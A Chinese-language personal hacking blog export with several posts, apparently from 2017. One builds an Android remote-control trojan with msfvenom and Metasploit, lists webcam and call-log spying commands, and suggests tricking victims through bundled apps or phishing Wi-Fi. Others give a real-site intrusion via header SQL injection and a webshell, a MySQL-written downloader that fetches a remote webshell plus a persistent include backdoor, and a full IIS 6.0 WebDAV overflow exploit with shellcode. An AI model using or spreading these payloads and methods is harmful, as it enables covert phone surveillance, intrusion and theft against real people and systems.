[{"title":"利用kali和pentestbox下的msf生成安卓木马","date":"2017-04-06T06:26:50.998Z","path":"2017/04/06/05/","text":"Metasploit“简称msf”，是一款开源的安全漏洞检测工具，集成了千百个攻击载荷和漏洞利用exp，安卓远控就是通过配置一个可回连的apk木马，设置好回连端口何IP，然后利用MSF里的一个TCP反弹shell的载荷进行对安卓手机的控制，具体操作如下。 12kalilinux :msfvenom -p android/meterpreter/reverse_tcp LHOST=10.20.72.178 LPORT=5555 R &gt; /root/1.apk pentestbox :1msfvenom -p android/meterpreter/reverse_tcp LHOST=10.20.72.178 LPORT=5555 R &gt; F:/1.apk 上面的命令大概就是利用msf生成一个可以回连侦听的APK安卓木马后门，LHOST填写你的本机IP，LPORT填写你要侦听的端口号，然后把文件重定向输出到你要的目录。 注：kali 2.0版本以后msf的生成pyload命令改成了msfvenom -p pentestbox: 在kalilinux下默认集成了msf，如果在Windows下使用msf，可以下载pentestbox，pentestbox是一款工具包，penbox下继承了大部分kali的工具，比如beef，burp，sqlmap等等，msf也集成了进去，所以总体来说还是很强大的。 当我们生成了APK木马后，然后我们配置msf，调用它的一个TCP反弹shell的载荷 命令如下：1234567msfconsole【打开msf】use exploit/multi/handerset payload android/meterpreter/reverse_tcp【选择payload】 show options 【查看参数情况】 注：pentestbox命令一样 从上面的图片我们可以看到，我们还没有设置要侦听的IP和端口信息，所以我们设置端口侦听。 12345set rhost 10.20.72.178 [这里设置的监听IP和刚刚生成的木马IP一样]set rport 5555 [设置刚刚生成木马的端口]exploit [开始监听] 当执行exploit的时候，msf已经处于监听端口的状态，只要你把你刚刚生成的安卓木马安装到对方手机上就会反弹一个msf的shell。 这是本机做测试生成的一个shell，我输入了sysinfo查看了被控端手机的设备信息，执行ifconfig查看了IP，当然，能做的事情不单单只有这么点点，比如还可以下载对方的通话记录，短信记录，开启对方的摄像头，拍照，录音功能，或者如果是root权限的话，直接增删改查任何文件也可是可以的。 通话记录截图： 命令：12345ifconfig 【查看端口】sysinfo 【查看系统信息】webcam list 【查看手机存在几个摄像头】webcam_snap -i 1或2【开启摄像头拍照】webcam_stream 【开启摄像头】 其他命令自己挖掘。可以利用help查看可用的命令。 小结网络问题：如果你本身的IP是内网IP，那么你最好开一个钓鱼wifl，或者把这个木马捆绑到一个正常的APK应用骗别人打开，当他人和你在同一网段才能进行端口监听，当然，你也可以进行内网转发，利用花生壳，等软件进行一个外网监听，这样只要你把APK木马移植到目标手机上，那么就可以进行监听操作，当然，前提是要对方开启网络。 免杀问题：现在的手机一般都是自带杀软，或者第三方杀软，msf生成的木马默认不是免杀的，所以在具体情况下要针对进行免杀。 ：） 内网转发的教程明天在写 pentestbox下载链接：下载 kalilinux下载链接：下载 后续pentestbox利用花生壳进行内网转发因为IPV4的地址有限，现在已经被分配的差不多了，所以大部分情况下，我们的PC电脑都是在内网当中，内网也就是私有的IP地址，也就是我们常说的局域网，例如： 192.168.1.0/24 10.10.20.0/24…上面这几个段都是一个内网C段，我们的PC大部分都是这样的，网吧也是如此。 私网是不能直接访问互联网的，必须做相关的路由策略或者进行一些配置才能接入到互联网，当然，首先你得有个宽带账号：） 所以，如果我们想配置安卓木马让外网的用户也能上线的话，我们就需要用到端口转发，也就是说，让别人可以直接访问到我们PC上的某个服务端口，进行建立连接，可以是httpweb网站服务，也可以和一个木马的控制端进行连接，这个其实非常简单！ 这里我们使用到的一个内网端口转发程序是“花生壳”。 花生壳的原理就是把你想转发的端口，通过服务，映射到某个外网的IP端口，学过网络的人可能知道，这个类似于NAT的多路复用转换原理。确实我感觉也是差不多。 首先我们注册一个花生壳的账户，并且在官网下载客户端，这些东西百度就好。 打开客户端，我们点击内网穿透，进行设置。我们申请一个免费域名，申请免费域名的目的，就是你内网要转发出去的那个服务器地址，这里花生壳利用一个域名当做外部地址。 这里我已经申请了两个免费域名，并且配置好了。 如果我们要添加一个内网穿透的地址，那么我们只要点击添加映射就行，如图： 上面的内容首先你添加一个名称，随便填即可。 然后填写你自己当前内网主机的IP地址，通过cmd下的ipconfig可以查看到 注：动态IP会每次重启后自动从dhcp服务器获取一个地址，所以不是固定的内网地址。 然后添加一个你要转发的端口号，因为当我们设置木马的时候，可以自己设置监听端口，所以，这里只要和木马的监听端口保持一致就好。 当我们设置好之后，我们就可以配置我们的木马了。 木马的配置上面讲的很明白，需要改动的地方，只要把反弹的地址IP换成你的域名地址，和你刚刚设置的端口号即可。 但是当我们msf设置本地监听的时候，我们需要设置监听的地址为我们本地的主机IP和端口，这些其实很简单。 以上做完以后，基本一个安卓木马的内外网上线已经很清楚了，如果不懂得话自己多琢磨就可以弄得很明白，或者在下面留言就好。 总结虽然这个实验目的技术要求不高，但是确实学到了很多东西，比如，内网转发，msf的基础使用，还有一些最基础的网络知识，当然，这些知识基础而已，更高级的的木马配置涉及到免杀绕过主动防御，自动上线反弹，等等，需要很底层的知识，遗憾的是我对这方面也不是很懂，需要自己不断地探索。 ：）","tags":[{"name":"kali 安卓木马","slug":"kali-安卓木马","permalink":"http://fjhack.me/tags/kali-安卓木马/"}]},{"title":"一次针对非法站点的渗透","date":"2017-04-05T07:30:28.970Z","path":"2017/04/05/04/","text":"算是朋友发过来的一个非法的基金操盘站，首先我们进行一些基本的信息判断收集。 ur：:http://www.xxxx.com/ 架构判断：php+阿帕奇+mysql+win/linux【大小写判断】 cms指纹：ecshop商城的二次开发 端口，旁站，C段等等 详细的信息就不列了，重点不在这里，这种站一般是要有前台的账号密码，当然，我也有。登录到前台大致看了下，简洁，url没有可利用传递的参数， 猜了几个比较常用的目录，没有发现什么，先上WVS扫一波吧，因为有会员账号， 所以登录状态扫描的话，会比不登录扫描爬到的页面更多，当然，前提是服务器没有防扫描，不然WVS的扫描动静碰到waf就死。这个站碰巧没有waf，当然，仅仅是没有waf，如果有waf的话只能利用其他的方法，比如说添加百度等这些友好的头部，waf对这些爬虫还是很友好的。 打开WVS，新建一个任务，然后在让你打开保存的cookie登录文件的地方新建一个工程文件，登录我们的账户，然后保存工程文件，退出，这里不说具体，详情可以去看WVS中文使用手册。看见红色高危，我就放心了，两个注入，一个XSS漏洞【估计是误报，XSS传递的参数都没有，事实证明是误报的】，测试漏洞，直接从SQL注入开始吧，看了一下WVS模拟的http包参数可以看到，这是一个基于HTTP头部Agent 的注入，这种注入很少碰到，百度看了下文章，跟cookie注入和host主机头注入是差不多的，也是对于提交参数不审核，带入数据库进行查询而产生的，当然手工有文章可是想快点验证，所以利用sqlmap直接注入。CODE： 123456789101112131415GET /home/index.php HTTP/1.1Referer: http://www.google.com/search?hl=en&amp;q=testingUser-Agent: if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"*/Client-IP: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Forwarded-Host: localhostAccept-Language: enVia: 1.1 wa.www.test.comOrigin: http://www.test.com/X-Requested-With: XMLHttpRequestCookie: real_ipd=1.180.212.49; ECS_ID=eff3314f58e854862f4299b7cd5eba26b5cd1a30; ECS[username]=H74652211; _ga=GA1.2.1142116738.1481088459; _gat=1Host: www.xxxx.comConnection: Keep-aliveAccept-Encoding: gzip,deflateAccept: */* 利用姿势： 首先抓取一个提交的get包，在get包里面我们可以看到agent头部信息，然后我们在agent信息后后面加上一个*标记，表示着重优先扫描，保存数据包到我们的sqlmap目录下。 然后打开sqlmap输入语句： sqlmap.py -r 1.txt –level 3 //这个等级三一般是用来检测头部注入 回车跑，出来了，存在注入，那么应该稳了吧，谁知道事实没这么顺利，跑出注入以后的几种思路 1.root权限，如果是root那么可以进行sql语句，读文件，和【有绝对路径】直接利用sql写shell。 2.普通权限，跑管理员的账号密码然后找后台地址，登录再进行尝试拿shell 然而两种都行不通，具体说下吧，首先我们跑了下权限，确实root，按道理来说root离拿shell没多远了，首先尝试直接跑管理员的密码数据，跑表列这些就不说了，我们直接跑当前库。 发现管理员的数据被保存在user_admin表下，跑出列内数据，MD5解密，发现两个都解不开，【最后上了服务器才发现hash密文是加盐的，也就是常说的双重加密】，换了几个国内外的MD5解密都解不开，看样子是运气不好。 那就换个思路，root权限按道理是可以执行sql语句的，那么我们是不是可以利用sql语句把原来的密文替换掉，或者我们自己新加一条管理员的数据呢，本地测试，可行，成功添加了管理员并且可以登录，那么我们也构造提交看看。 本地测试结果： 语句： sqlmap.py -r 1.txt –level 3 –sql-shell//进入sqlshell 然后执行mysql语句 insert into admin_user (username，password) values (‘admin88’,’MD5密文’) 想在管理员的列内添加一个admin88用户，执行之后发现，报错，百度看了下，说是模式问题，那么换种执行SQL语句的模式 sqlmap.py -r 1.txt –level 3 –sql-query “insert into admin_user (username，password) values (‘admin88’,’MD5密文’) “ 发现还是执行不了，然后请教一些大牛，大牛们说，不能执行多条语句，那么我们尝试执行 show databases 和 show tables 发现还是不行【最后发现是360在做鬼】 两种思路不行，那么只有尝试最后一种思路，写shell，因为是mysql，我们需要找到网站的绝对路径，找了很久没有找到【读阿帕奇的默认配置文件，尝试猜解路径等等】最后是在wvs里面已经爆出了绝对路径，自己没有发现而已 【以后要细心】，得到绝对路径D:\\WWW\\xxx\\home\\尝试写shell。 sqlmap.py -r 1.txt –level 3 –os-shell 发现也写不进去，有大牛说是目录不允许写入，换了几个目录，包括upload目录，应该不是权限的问题，最后还是失败，这时候觉得有点问题了，执行不了SQL语句，写不了shell，破解不了管理员密码，那这个注入也没什么用了， 还是返回思路，看了下WVS，也没发现什么可以利用的。 最后抱着试试的心态读了一下数据库的用户密码和一些配置文件，因为是root权限，而且服务器开了3306端口，如果允许外连的话，应该会有突破点。 读出来了 root/root 用工具尝试外连Mysql默认关闭外连。 失败。。。 这时候快要放弃了，朋友发来一个页面，也就是前台的会员上传头像的地方，有上传点是否有上传漏洞呢，尝试上传，首先上传一张正常的图片，发现上传后，审查元素查看路径，发现可以访问，那么这个上传点是正常的没有坏。 那么尝试直接上传脚本。这时候无语了，发现也上传上去了，审查元素，查看路径，进行访问，404！竟然访问不到？ 再次上传图片，发现可以访问，这时候进行判断，是否有waf之类的东西，上传一个txt，发现也访问不到，那么应该不是waf，最后测试发现，除了上传图片，其他的上传文件几乎都访问不到，这就有点迷惑了，为什么有上传路径但 是却访问不到呢，抓包看看，抓包看了没发现什么区别，上传图片和其他格式的文件服务器返回的响应都是302，那么按道理是存在任意上传，而且文件应该上传上去了，测试了几种突破上传，无果，那么为什么访问不到呢，这时候 反复试了几次，大概判断是waf之类的在做鬼，把上传的图片文件内容替换成了一个免杀一句话，然后不通过审查元素查看路径看看，利用抓包路径访问，发现，成功上传shell，但是直接访问url是报错的，那么用菜刀尝试连接一下，成功getshell，拿到一句话权 限之后，发现开始上传的图片，txt都在目录下，唯独php那些脚本不见了，难道是被杀了，只有上服务器一探究竟了。 一句话的权限还是很大的，sys权限，跨磁盘也有增删改查权限，看了一下IP，是外网可以直接3389连接。直接提权，连接，连接之后发现原来是360主动防御在做鬼，难怪执行不了SQL语句和写入文件，却可以进行扫描【后面尝试 写入文件发现360自动阻拦】，然后打开数据库，尝试增加一条数据，发现增加后的数据后台登录不了，最后发现原来cms利用了加盐的加密，难怪死活解不开，那么我们把加密值改为0，添加一条未加盐的MD5密文，数据库会默认改为加盐值，当然，如果你想解开管理员原有的密码，只能够解开他的加密算法，在进行MD5接密，最后成功添加，进入后台之。 渗透到此结束，写了一些思路也不全是我一个人的思路，有朋友帮忙，有些东西也没写出来，因为敏感，图片贴的比较少，因为怕人爆菊【查水表就不好了】，写这个笔记的原因也是为了以后没思路的时候看看，这次的渗透主要是想说明，两个问题。 第一：思路要明确，要细心，不要放过任何一个可以利用的地方，渗透如果说你没有0day或者其他的技巧的话，你就需要比别人多一份细心。 第二：不要习惯自己的方法，比如说审查元素查看上传后的地址，要习惯与抓包查看，要细心分析每一个地方。 PS：因为敏感网站，固打码，图片较少因为HEXO的图片引用太麻烦，如果一定需要图片的话，会加上去，没有什么奇淫技巧，只是一点小小的经验 :)","tags":[{"name":"-渗透笔记","slug":"渗透笔记","permalink":"http://fjhack.me/tags/渗透笔记/"}]},{"title":"利用MySQLROOT权限远程下载脚本绕过云锁拿shell","date":"2017-04-04T13:20:00.950Z","path":"2017/04/04/03/","text":"碰到个阿里云盾+安全狗+云锁+thinkphp的站，其实也没什么思路，前台上传有JS的验证，后端还有白名单，只是运气好，扫出个备份文件，得到其数据库账户，连接之。 连接上，通过查看MySQL数据库下的user表，发现是root用户的权限和当前用户是一样的，那么就是root 了。思路，找到后台账户密码，登录之，发现也没什么利用的，上传点和前台一样白名单。 换思路，利用MySQL写文件函数，写shell进网站的目录，首先需要知道网站的绝对路径，利用thinkPHP的报错特性，爆出绝对路径。直接执行SQL语句 select ‘一句话’ into outfile ‘D://thinkhphp//xx//1.php’ 注意：云锁如果不检测写入的内容的话可以直接写明文， 但是最好写hex加密代码，那么代码就不需要单引号括起来，还要注意的就是，写绝对路径必须写两个“/”,除非写\\，否则会被转义。 本机测试，成功写入一句话，但是连接的时候被云锁拦截了，个人感觉可能是云锁拦截了post的特征，需要修改菜刀的连接特征，可惜我不会。.直接写入大马测试，nosafe的大马可以正常使用，直接写入大马，发现大马字符太大没办法写入，这时候利用95zz发的一个脚本，执行远程下载，他在文章中说因为云锁是拦截php代码的，例如&lt;? ?&gt;，的头部，所以远程下载的脚本是利用JavaScript转写php 1&lt;script language=\"php\"&gt; $a='http://远程地址/sss.txt';$b='file'.'_g'.'et_'.'contents';$b = $b($a);file_put_contents('file.php',$b); &lt;/script&gt; 这行代码是利用一个远程下载函数，将远程服务器的文件下载，并重新生成一个file.php的php代码，所以我们在自己的web服务器上放上大马的txt，配合利用MySQL的文件写入先生成一个远程下载的php，在直接访问这个php，生成一个php大马，测试通过，成功getshell，尝试提权，无法使用大部分cmd提权命令，目的只需要shell权限就好，没有深究，做了一个文件包含，固权，退之。 包含脚本：12345if(isset($_GET[\"id\"]))&#123;require_once('D:\\\\WWW\\\\web\\\\images\\\\load.jpg');&#125;注意闭合。","tags":[{"name":"绕过Waf","slug":"绕过Waf","permalink":"http://fjhack.me/tags/绕过Waf/"},{"name":"渗透笔记","slug":"渗透笔记","permalink":"http://fjhack.me/tags/渗透笔记/"}]},{"title":"IIS6.0远程代码执行漏洞个人浅析","date":"2017-04-03T08:22:32.720Z","path":"2017/04/03/02/","text":"PS：不喜可以喷，要是要喷的有理由，这样你指出了我的错误，我也得到了学习何乐而不为？ IIS6.0远程代码执行的漏洞是发生在WebDav开启情况下发生的，当IIS6.0开启这个服务可以存在缓存区域溢出。 官方给出的exp： 1234567891011121314151617import socket sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect(('192.168.5.128',88)) pay='PROPFIND / HTTP/1.1\\r\\nHost: 192.168.5.128:88\\r\\nContent-Length: 0\\r\\n'pay+='If: &lt;http://192.168.5.128:88/aaaaaaa'pay+='\\xe6\\xbd\\xa8\\xe7\\xa1\\xa3\\xe7\\x9d\\xa1\\xe7\\x84\\xb3\\xe6\\xa4\\xb6\\xe4\\x9d\\xb2\\xe7\\xa8\\xb9\\xe4\\xad\\xb7\\xe4\\xbd\\xb0\\xe7\\x95\\x93\\xe7\\xa9\\x8f\\xe4\\xa1\\xa8\\xe5\\x99\\xa3\\xe6\\xb5\\x94\\xe6\\xa1\\x85\\xe3\\xa5\\x93\\xe5\\x81\\xac\\xe5\\x95\\xa7\\xe6\\x9d\\xa3\\xe3\\x8d\\xa4\\xe4\\x98\\xb0\\xe7\\xa1\\x85\\xe6\\xa5\\x92\\xe5\\x90\\xb1\\xe4\\xb1\\x98\\xe6\\xa9\\x91\\xe7\\x89\\x81\\xe4\\x88\\xb1\\xe7\\x80\\xb5\\xe5\\xa1\\x90\\xe3\\x99\\xa4\\xe6\\xb1\\x87\\xe3\\x94\\xb9\\xe5\\x91\\xaa\\xe5\\x80\\xb4\\xe5\\x91\\x83\\xe7\\x9d\\x92\\xe5\\x81\\xa1\\xe3\\x88\\xb2\\xe6\\xb5\\x8b\\xe6\\xb0\\xb4\\xe3\\x89\\x87\\xe6\\x89\\x81\\xe3\\x9d\\x8d\\xe5\\x85\\xa1\\xe5\\xa1\\xa2\\xe4\\x9d\\xb3\\xe5\\x89\\x90\\xe3\\x99\\xb0\\xe7\\x95\\x84\\xe6\\xa1\\xaa\\xe3\\x8d\\xb4\\xe4\\xb9\\x8a\\xe7\\xa1\\xab\\xe4\\xa5\\xb6\\xe4\\xb9\\xb3\\xe4\\xb1\\xaa\\xe5\\x9d\\xba\\xe6\\xbd\\xb1\\xe5\\xa1\\x8a\\xe3\\x88\\xb0\\xe3\\x9d\\xae\\xe4\\xad\\x89\\xe5\\x89\\x8d\\xe4\\xa1\\xa3\\xe6\\xbd\\x8c\\xe7\\x95\\x96\\xe7\\x95\\xb5\\xe6\\x99\\xaf\\xe7\\x99\\xa8\\xe4\\x91\\x8d\\xe5\\x81\\xb0\\xe7\\xa8\\xb6\\xe6\\x89\\x8b\\xe6\\x95\\x97\\xe7\\x95\\x90\\xe6\\xa9\\xb2\\xe7\\xa9\\xab\\xe7\\x9d\\xa2\\xe7\\x99\\x98\\xe6\\x89\\x88\\xe6\\x94\\xb1\\xe3\\x81\\x94\\xe6\\xb1\\xb9\\xe5\\x81\\x8a\\xe5\\x91\\xa2\\xe5\\x80\\xb3\\xe3\\x95\\xb7\\xe6\\xa9\\xb7\\xe4\\x85\\x84\\xe3\\x8c\\xb4\\xe6\\x91\\xb6\\xe4\\xb5\\x86\\xe5\\x99\\x94\\xe4\\x9d\\xac\\xe6\\x95\\x83\\xe7\\x98\\xb2\\xe7\\x89\\xb8\\xe5\\x9d\\xa9\\xe4\\x8c\\xb8\\xe6\\x89\\xb2\\xe5\\xa8\\xb0\\xe5\\xa4\\xb8\\xe5\\x91\\x88\\xc8\\x82\\xc8\\x82\\xe1\\x8b\\x80\\xe6\\xa0\\x83\\xe6\\xb1\\x84\\xe5\\x89\\x96\\xe4\\xac\\xb7\\xe6\\xb1\\xad\\xe4\\xbd\\x98\\xe5\\xa1\\x9a\\xe7\\xa5\\x90\\xe4\\xa5\\xaa\\xe5\\xa1\\x8f\\xe4\\xa9\\x92\\xe4\\x85\\x90\\xe6\\x99\\x8d\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\xa0\\xb4\\xe6\\x94\\xb1\\xe6\\xbd\\x83\\xe6\\xb9\\xa6\\xe7\\x91\\x81\\xe4\\x8d\\xac\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe5\\x8d\\x83\\xe6\\xa9\\x81\\xe7\\x81\\x92\\xe3\\x8c\\xb0\\xe5\\xa1\\xa6\\xe4\\x89\\x8c\\xe7\\x81\\x8b\\xe6\\x8d\\x86\\xe5\\x85\\xb3\\xe7\\xa5\\x81\\xe7\\xa9\\x90\\xe4\\xa9\\xac'pay+='&gt;'pay+=' (Not &lt;locktoken:write1&gt;) &lt;http://192.168.5.128:88/bbbbbbb'pay+='\\xe7\\xa5\\x88\\xe6\\x85\\xb5\\xe4\\xbd\\x83\\xe6\\xbd\\xa7\\xe6\\xad\\xaf\\xe4\\xa1\\x85\\xe3\\x99\\x86\\xe6\\x9d\\xb5\\xe4\\x90\\xb3\\xe3\\xa1\\xb1\\xe5\\x9d\\xa5\\xe5\\xa9\\xa2\\xe5\\x90\\xb5\\xe5\\x99\\xa1\\xe6\\xa5\\x92\\xe6\\xa9\\x93\\xe5\\x85\\x97\\xe3\\xa1\\x8e\\xe5\\xa5\\x88\\xe6\\x8d\\x95\\xe4\\xa5\\xb1\\xe4\\x8d\\xa4\\xe6\\x91\\xb2\\xe3\\x91\\xa8\\xe4\\x9d\\x98\\xe7\\x85\\xb9\\xe3\\x8d\\xab\\xe6\\xad\\x95\\xe6\\xb5\\x88\\xe5\\x81\\x8f\\xe7\\xa9\\x86\\xe3\\x91\\xb1\\xe6\\xbd\\x94\\xe7\\x91\\x83\\xe5\\xa5\\x96\\xe6\\xbd\\xaf\\xe7\\x8d\\x81\\xe3\\x91\\x97\\xe6\\x85\\xa8\\xe7\\xa9\\xb2\\xe3\\x9d\\x85\\xe4\\xb5\\x89\\xe5\\x9d\\x8e\\xe5\\x91\\x88\\xe4\\xb0\\xb8\\xe3\\x99\\xba\\xe3\\x95\\xb2\\xe6\\x89\\xa6\\xe6\\xb9\\x83\\xe4\\xa1\\xad\\xe3\\x95\\x88\\xe6\\x85\\xb7\\xe4\\xb5\\x9a\\xe6\\x85\\xb4\\xe4\\x84\\xb3\\xe4\\x8d\\xa5\\xe5\\x89\\xb2\\xe6\\xb5\\xa9\\xe3\\x99\\xb1\\xe4\\xb9\\xa4\\xe6\\xb8\\xb9\\xe6\\x8d\\x93\\xe6\\xad\\xa4\\xe5\\x85\\x86\\xe4\\xbc\\xb0\\xe7\\xa1\\xaf\\xe7\\x89\\x93\\xe6\\x9d\\x90\\xe4\\x95\\x93\\xe7\\xa9\\xa3\\xe7\\x84\\xb9\\xe4\\xbd\\x93\\xe4\\x91\\x96\\xe6\\xbc\\xb6\\xe7\\x8d\\xb9\\xe6\\xa1\\xb7\\xe7\\xa9\\x96\\xe6\\x85\\x8a\\xe3\\xa5\\x85\\xe3\\x98\\xb9\\xe6\\xb0\\xb9\\xe4\\x94\\xb1\\xe3\\x91\\xb2\\xe5\\x8d\\xa5\\xe5\\xa1\\x8a\\xe4\\x91\\x8e\\xe7\\xa9\\x84\\xe6\\xb0\\xb5\\xe5\\xa9\\x96\\xe6\\x89\\x81\\xe6\\xb9\\xb2\\xe6\\x98\\xb1\\xe5\\xa5\\x99\\xe5\\x90\\xb3\\xe3\\x85\\x82\\xe5\\xa1\\xa5\\xe5\\xa5\\x81\\xe7\\x85\\x90\\xe3\\x80\\xb6\\xe5\\x9d\\xb7\\xe4\\x91\\x97\\xe5\\x8d\\xa1\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe4\\x89\\x87\\xe7\\x99\\xaa\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\x89\\x97\\xe4\\xbd\\xb4\\xe5\\xa5\\x87\\xe5\\x88\\xb4\\xe4\\xad\\xa6\\xe4\\xad\\x82\\xe7\\x91\\xa4\\xe7\\xa1\\xaf\\xe6\\x82\\x82\\xe6\\xa0\\x81\\xe5\\x84\\xb5\\xe7\\x89\\xba\\xe7\\x91\\xba\\xe4\\xb5\\x87\\xe4\\x91\\x99\\xe5\\x9d\\x97\\xeb\\x84\\x93\\xe6\\xa0\\x80\\xe3\\x85\\xb6\\xe6\\xb9\\xaf\\xe2\\x93\\xa3\\xe6\\xa0\\x81\\xe1\\x91\\xa0\\xe6\\xa0\\x83\\xcc\\x80\\xe7\\xbf\\xbe\\xef\\xbf\\xbf\\xef\\xbf\\xbf\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xd1\\xae\\xe6\\xa0\\x83\\xe7\\x85\\xae\\xe7\\x91\\xb0\\xe1\\x90\\xb4\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\\xe9\\x8e\\x91\\xe6\\xa0\\x80\\xe3\\xa4\\xb1\\xe6\\x99\\xae\\xe4\\xa5\\x95\\xe3\\x81\\x92\\xe5\\x91\\xab\\xe7\\x99\\xab\\xe7\\x89\\x8a\\xe7\\xa5\\xa1\\xe1\\x90\\x9c\\xe6\\xa0\\x83\\xe6\\xb8\\x85\\xe6\\xa0\\x80\\xe7\\x9c\\xb2\\xe7\\xa5\\xa8\\xe4\\xb5\\xa9\\xe3\\x99\\xac\\xe4\\x91\\xa8\\xe4\\xb5\\xb0\\xe8\\x89\\x86\\xe6\\xa0\\x80\\xe4\\xa1\\xb7\\xe3\\x89\\x93\\xe1\\xb6\\xaa\\xe6\\xa0\\x82\\xe6\\xbd\\xaa\\xe4\\x8c\\xb5\\xe1\\x8f\\xb8\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81'shellcode='\"VYhffffk4diFkDql02Dqm0D1CuEE5n3l0G3j3C0S1p02024B0W3y2G2u4D0k4q3c\".\"0615092E0T0H0l4s4u1k0A2p3G0Y3W3A0u2K2J0P2o4E3U2L370w3N5O3h2p1O2w1o3v4\".\"T3P4n1K3v4n0z3Y0S0M2k5L4J0m4Y2D103V2s4K4t0Q0U0P7o2L4P2O8K3r0j0y0N0s37\".\"2l0m5K0Y8M0S5p4V110Q2J182s7M2K344J3j04VYVTX10X41PZ41H4A4I1TA71TADVTZ3\".\"2PZNBFZDQC02DQD0D13DJEON4F1W9M490R0P0654E2M9Y2F64346K5K450115MN2G0N0\".\"B0L5C5DKO106737KO9W8P0O2L1L0P184E3U0Q8P1G3L5O9R601E671O9W343QOO113RJO\".\"LK8M640M1K3WOL1W4Y2O613V2I4K5C0R0S0PMO2O3W2O8K9R1Z1K0S1H3PLMKM5KKK8M0\".\"S4JJL15612J1267KM2K4D903K03VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQ\".\"AIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYA\".\"ZBABABABAB30APB944JB9K7YMY7Y7O1SKWKQ0X6QLT8Y2TMTJT1K3S7SKT013KLUKS3KL\".\"U3QJR1Y04MT4S1Y6L9UKTLX0I1P096TJPML5N0E5K4O6LMP07MW038R9WJT9K0J4M5NOK\".\"KKMS3N0L4L8S1N8NLW11JV1V6YKO1SMO1P2OMNKOMK4N8QOO0KKR104POLLZ3XLWJXML6\".\"SKN03MQMK0GMQ1ZLZ8K6Y4LKPA\";'pay+=shellcodepay+='&gt;\\r\\n\\r\\n'print paysock.send(pay) data = sock.recv(80960) print datasock.close 用原作者的话说，他的POC是利用3次溢出构建ROP链，绕过内存地址随机化，说实话我是听不懂的任何一个名词的，只了解字面上的意思，但是想了解原理，于是从exp代码分析 从上面的Python代码我们可以进行分析这个漏洞利用的整个过程，个人认为，就是利用了webdav服务的开启，可以进行更多的数据提交方式，默认的话是get,post,cookie，这几类，当然，如果开启接收任何提交方式的请求，那么可以利用put提交方式，直接写shell，类似的提交方式还有move，copy，del等等，但是上面的代码利用提交方式不是http自带的提交方式，而是利用是一个扩展协议，PROPFIND，而不是传统的http协议，propfind正常的情况下是查看属性的提交方式，当我们利用缓冲区域溢出，也就是当提交的数据，超出了程序能够承载的量那么就会导致程序出错，也就是造成了溢出。 从上面的代码我分析了一下，这个poc分为三个部分，导包指定目的IP就不用说了，直接按照自己的理解就是 第一个部分就是利用propfind的方式向服务器进行提交数据。 第二部分就提交的pay数据值就是一段缓冲区域溢出代码，看样子是一些占位比较大的符号进行了hex编码，当webdav接收这些参数的时候，会处理不过来，也就造成了数据溢出，我们提交的数据有一部分已经溢出了webdav程序的这个容器，溢出的数据都会在进程中，如果我们可以控制溢出的数据，那么我们可以进行一个代码执行。 第三个部分也就是我们要控制的溢出参数，上面的poc给定的值是“shellcode”，通过一些测试和询问发现，这个shellcode值可能是利用msf生成的一个payload，然后利用编码器，将代码编为“x86/unicode_upper”，因为本人小白，不太懂底层的东西，感觉这可能是内存或者底层能够识别的编码方式吧，通过这个poc，发现这个shellcode的作用就是在进程中溢出一个计算器的进程，用户权限是network，权限虽然小但是还是有很多可以利用的方法，通过检测发现，这个漏洞貌似只有支持PROPFIND的请求方法才会有效，个人测试了几个扩展协议没有成功溢出shellcode，或许是我的姿势不对吧,至少我这么尝试没有成功。 总结：这个漏洞的总体利用过程 检查服务器是否开启webdav服务【我们可以利用OPTIONS的请求方法进行判断服务器是否开启WEBDAV，且支持propfind的请求方法】 → 通过扩展协议propfind，向服务器发送一个缓冲区溢出代码和可控制的shellcode → 然后服务器接受到这个包发生了缓冲区溢出，将我们的shellcode溢出到了进程中。 那么利用这个漏洞，我们如果可以控制shllecode，是不是可以直接注入一个反弹shell的payload，或者说是一个远程木马，因为直接注入进程等于不用执行文件，绕过waf，等等，当然没有汇编基础还是不行的，所以只能慢慢学，问了问搞编程的朋友，是否可以直接利用这个漏洞写类似于远控程序，或者其他的后门的，他的回答是肯定可以的，具体的话涉及到内存的转换和储存过程，这些我们暂时不深究，因为只有实验才能给出答案，如果我成功了，我肯定会写出续文，虽然这个漏洞挺鸡肋，到此为止总结大概也完了。 以上是个人的愚见总结，其实感觉这个漏洞是挺有意思的，虽然现在用IIS6.0的服务器是越来越少了，但是我相信，在底层，有更多的漏洞都是基于“缓冲区域溢出”，并且常规的waf对此事无法拦截的【比如基于缓冲区域溢出的SQL注入攻击:) 】可惜无奈自己对底层的东西还是了解的太少了。要花时间去补习这些底层知识。 最后附上一个大牛写出来可利用msf直接加载攻击的exp，目前只针对Windows2003 R2版本有效，直接利用Metasploit把这个攻击载荷加入进去，set一下配置即可完成攻击，具体是返回一个network权限的shell。 MSF利用exp: 下载 参考文献：这篇确实讲的很详细，可以学到很多东西！http://www.tuicool.com/articles/7ziu6jE","tags":[{"name":"IIS6.0","slug":"IIS6-0","permalink":"http://fjhack.me/tags/IIS6-0/"},{"name":"代码执行漏洞","slug":"代码执行漏洞","permalink":"http://fjhack.me/tags/代码执行漏洞/"}]},{"title":"诞生日---第一篇博文","date":"2017-04-01T11:48:46.717Z","path":"2017/04/01/01/","text":"Hello，Word！在自己的摸索下，HEXO的博客终于搭建起来了，开这个博客有很多原因，感觉如果不用博客德华都不好意思自己是搞IT得，开玩笑的，其实最重要还是只想让自己做个不浮躁的人，只有沉下心才能学到更多的东西，当然，不一定会有人关注，但是自己的小圈子内能够互相学习，就够了，很乐意结交更多的朋友，一起交流，而不是互相吹捧，因为那毫无意义。每个人都是从小白做起，这个圈子里面似乎并没有尽头，当你接触久了就会发现，